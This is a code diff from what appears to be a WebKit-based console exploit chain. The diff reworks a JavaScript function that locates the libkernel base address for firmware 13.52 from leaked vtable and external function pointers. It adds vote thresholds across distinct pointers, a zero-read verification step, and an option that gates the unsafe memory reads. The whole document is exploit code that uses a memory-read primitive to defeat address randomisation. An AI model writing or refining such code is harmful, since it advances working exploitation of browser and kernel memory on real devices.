@@ -406,10 +406,11 @@ export function collectLiveVtableExtPtrs(p, webkitBase, off, opts) {
 }
 
 /**
- * Auto-resolve libkernel from a list of ext fn ptrs.
- * 1) Suchi RVA subtract + vote (0 reads)
- * 2) SCE/ELF header vote below ptrs (resolveExtListVote)
- * 3) Per-ptr lite resolve + usleep verify (bounded reads)
+ * Auto-resolve libkernel from ext fn ptrs — **0 reads @ candidate lk** (wrong lk OOMs on 13.52).
+ * 1) Suchi RVA subtract + vote across ptrs
+ * 2) verifyLibkernelZeroRead (…c30 tag only — no prologue peek)
+ * Requires ≥2 distinct ext ptrs agreeing on same lk unless opts.minVotes=1.
+ * Header-walk / prologue verify only if opts.allowLkReads===true (unsafe).
  */
 export function resolveLibkernelFromExtList(p, webkitBase, off, entries, opts) {
     opts = opts || {};
@@ -418,8 +419,11 @@ export function resolveLibkernelFromExtList(p, webkitBase, off, entries, opts) {
         return { ok: false, error: "no ext ptrs", tried: 0 };
     }
 
-    const minVotes = opts.minVotes != null ? opts.minVotes : 1;
-    const doVerify = opts.verify !== false;
+    const zeroReadOnly = opts.allowLkReads !== true;
+    const minVotes = opts.minVotes != null ? opts.minVotes : 2;
+    const minDistinctFn = opts.minDistinctFn != null
+        ? opts.minDistinctFn
+        : (minVotes > 1 ? 2 : 1);
     const lkVotes = new Map();
     const hexList = [];
     let skipped = 0;
@@ -439,6 +443,7 @@ export function resolveLibkernelFromExtList(p, webkitBase, off, entries, opts) {
         }
         tried++;
         hexList.push(ptrBig(fnPtr).toString(16));
+        const fnKey = ptrBig(fnPtr).toString(16);
 
         const zeros = calcLkFromFnPtrZeroRead(fnPtr, off);
         for (let zi = 0; zi < zeros.length; zi++) {
@@ -451,13 +456,15 @@ export function resolveLibkernelFromExtList(p, webkitBase, off, entries, opts) {
                     count: 0,
                     vias: [],
                     refs: [],
+                    fnKeys: new Set(),
                 };
                 lkVotes.set(key, ent);
             }
             ent.count++;
+            ent.fnKeys.add(fnKey);
             if (ent.vias.indexOf(z.via) < 0 && ent.vias.length < 4)
                 ent.vias.push(z.via);
-            const ref = (entry.label || "ext") + ":" + ptrBig(fnPtr).toString(16).slice(-8);
+            const ref = (entry.label || "ext") + ":" + fnKey.slice(-8);
             if (ent.refs.length < 6)
                 ent.refs.push(ref);
         }
@@ -465,103 +472,102 @@ export function resolveLibkernelFromExtList(p, webkitBase, off, entries, opts) {
 
     const zeroRank = [];
     lkVotes.forEach(function (ent) {
+        ent.distinctFn = ent.fnKeys ? ent.fnKeys.size : 0;
         zeroRank.push(ent);
     });
     zeroRank.sort(function (a, b) {
-        return b.count - a.count || a.vias.length - b.vias.length;
+        return b.distinctFn - a.distinctFn
+            || b.count - a.count
+            || b.vias.length - a.vias.length;
     });
 
     for (let ri = 0; ri < zeroRank.length; ri++) {
         const cand = zeroRank[ri];
         if (cand.count < minVotes) continue;
-        if (doVerify) {
-            const v = verifyLibkernelUsleep1352(p, cand.lk, off);
-            if (!v.ok) continue;
-            return {
-                ok: true,
-                lk: cand.lk,
-                via: "zero-vote+" + cand.count + "+" + (cand.vias[0] || "?"),
-                method: "zero-vote",
-                vote: cand.count,
-                rank: ri,
-                tried: tried,
-                skipped: skipped,
-                zeroRank: zeroRank.slice(0, 4),
-            };
-        }
+        if (cand.distinctFn < minDistinctFn) continue;
+        const v = verifyLibkernelZeroRead(cand.lk, off, { via: "zero-vote" });
+        if (!v.ok) continue;
         return {
             ok: true,
             lk: cand.lk,
-            via: "zero-vote+" + cand.count + "+" + (cand.vias[0] || "?"),
+            via: "zero-vote+" + cand.distinctFn + "fn+" + cand.count + "x"
+                + "+" + (cand.vias[0] || "?"),
             method: "zero-vote",
             vote: cand.count,
+            distinctFn: cand.distinctFn,
             rank: ri,
             tried: tried,
             skipped: skipped,
+            zeroRead: true,
+            reads: 0,
             zeroRank: zeroRank.slice(0, 4),
         };
     }
 
-    if (hexList.length) {
+    if (!zeroReadOnly && hexList.length) {
         const voteOpts = Object.assign({}, opts);
         const voted = resolveExtListVote(p, hexList, off, webkitBase, voteOpts);
         if (voted && voted.lk) {
-            if (doVerify) {
-                const vu = verifyLibkernelUsleep1352(p, voted.lk, off);
-                if (vu.ok) {
-                    return Object.assign({
-                        ok: true,
-                        method: "header-vote",
-                        tried: tried,
-                        skipped: skipped,
-                        zeroRank: zeroRank.slice(0, 4),
-                        voteRank: voteOpts._voteRank || [],
-                    }, voted);
-                }
-            } else {
+            const vu = verifyLibkernelUsleep1352(p, voted.lk, off);
+            if (vu.ok) {
                 return Object.assign({
                     ok: true,
                     method: "header-vote",
                     tried: tried,
                     skipped: skipped,
+                    zeroRank: zeroRank.slice(0, 4),
+                    voteRank: voteOpts._voteRank || [],
+                    zeroRead: false,
                 }, voted);
             }
         }
     }
 
-    for (let ei = 0; ei < entries.length; ei++) {
-        const fnPtr = extEntryFnPtr(entries[ei]);
-        if (!fnPtr || !plausibleExtPtr(fnPtr, webkitBase, off)) continue;
-        const hit = resolveExtPtrToLibkernel(p, fnPtr, off, webkitBase, null, {
-            lite: true,
-            maxWalkPages: 0,
-            zeroReadOnly: false,
-        });
-        if (!hit || !hit.lk) continue;
-        if (doVerify) {
-            const v = verifyLibkernelUsleep1352(p, hit.lk, off);
+    if (!zeroReadOnly) {
+        for (let ei = 0; ei < entries.length; ei++) {
+            const fnPtr = extEntryFnPtr(entries[ei]);
+            if (!fnPtr || !plausibleExtPtr(fnPtr, webkitBase, off)) continue;
+            const hit = resolveExtPtrToLibkernel(p, fnPtr, off, webkitBase, null, {
+                lite: true,
+                maxWalkPages: 0,
+                zeroReadOnly: true,
+            });
+            if (!hit || !hit.lk) continue;
+            const v = verifyLibkernelZeroRead(hit.lk, off);
             if (!v.ok) continue;
+            return {
+                ok: true,
+                lk: hit.lk,
+                iatRva: hit.iatRva,
+                via: hit.via,
+                method: "ext-resolve",
+                fnPtr: String(fnPtr),
+                label: entries[ei].label || "?",
+                tried: tried,
+                skipped: skipped,
+                zeroRank: zeroRank.slice(0, 4),
+                zeroRead: true,
+                reads: 0,
+            };
         }
-        return {
-            ok: true,
-            lk: hit.lk,
-            iatRva: hit.iatRva,
-            via: hit.via,
-            method: "ext-resolve",
-            fnPtr: String(fnPtr),
-            label: entries[ei].label || "?",
-            tried: tried,
-            skipped: skipped,
-            zeroRank: zeroRank.slice(0, 4),
-        };
+    }
+
+    let hint = "need " + minDistinctFn + "+ distinct ext ptrs → same …"
+        + (lkBaseTag(off) != null ? lkBaseTag(off).toString(16) : "c30")
+        + " (0 reads — no lk peek)";
+    if (zeroRank.length === 1 && zeroRank[0].distinctFn < 2) {
+        hint = "only 1 ext fn ptr matched — need 2+ agreeing ptrs (0-read, no lk probe)";
     }
 
     return {
         ok: false,
         error: "no lk from " + tried + " ext ptrs (skipped " + skipped + ")",
+        hint: hint,
         tried: tried,
         skipped: skipped,
         zeroRank: zeroRank.slice(0, 6),
+        zeroRead: true,
+        reads: 0,
     };
 }
 
